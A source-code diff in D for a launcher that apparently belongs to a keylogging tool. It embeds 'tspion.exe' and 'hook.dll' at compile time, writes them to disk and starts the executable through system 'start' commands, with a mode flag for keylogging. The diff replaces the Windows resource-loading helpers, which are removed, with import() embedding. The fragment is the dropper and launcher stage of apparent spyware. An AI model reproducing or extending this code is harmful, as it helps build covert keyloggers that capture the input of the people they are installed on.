@@ -40,8 +40,8 @@ void main() {
 }
 
 void unpack() {
-	char[] exedata = loadExeRC();
-	char[] dlldata = loadDllRC();
+	immutable char[] exedata = import("tspion.exe");
+	immutable char[] dlldata = import("hook.dll");
 	
 	write_wp(exedata, "tspion.exe");
 	write_wp(dlldata, "hook.dll");
@@ -88,42 +88,4 @@ void launch(bool beginkeylog) {
 		std.process.system(`start tspion.exe sd "`~modname~`"`);
 	else
 		std.process.system(`start tspion.exe sdonly "`~modname~`"`);
-}
-
-Exception up(string msg) {
-	return new Exception(msg);
-}
-
-char[] loadExeRC() {
-	HRSRC hrc = FindResourceExA(GetModuleHandleA(null),
-								MAKEINTRESOURCEA(10),
-								MAKEINTRESOURCEA(300),  //Resource 300 (tspion.exe)
-								cast(ushort)MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL));
-	if(!hrc)
-		throw up("Could not find resources.");  //har har har.
-		
-	HGLOBAL hrc_h = LoadResource(null, hrc);
-	if(!hrc)
-		throw up("Could not load resources.");
-		
-	auto rcsize = SizeofResource(null, hrc);
-	char[] rcdata = (cast(char*)LockResource(hrc_h))[0 .. rcsize];
-	return rcdata;
-}
-
-char[] loadDllRC() {
-	HRSRC hrc = FindResourceExA(GetModuleHandleA(null),
-								MAKEINTRESOURCEA(10),
-								MAKEINTRESOURCEA(5000),  //Resource 5000 (hook.dll)
-								cast(ushort)MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL));
-	if(!hrc)
-		throw up("Could not find resources.");  //har har har.
-		
-	HGLOBAL hrc_h = LoadResource(null, hrc);
-	if(!hrc)
-		throw up("Could not load resources.");
-		
-	auto rcsize = SizeofResource(null, hrc);
-	char[] rcdata = (cast(char*)LockResource(hrc_h))[0 .. rcsize];
-	return rcdata;
 }
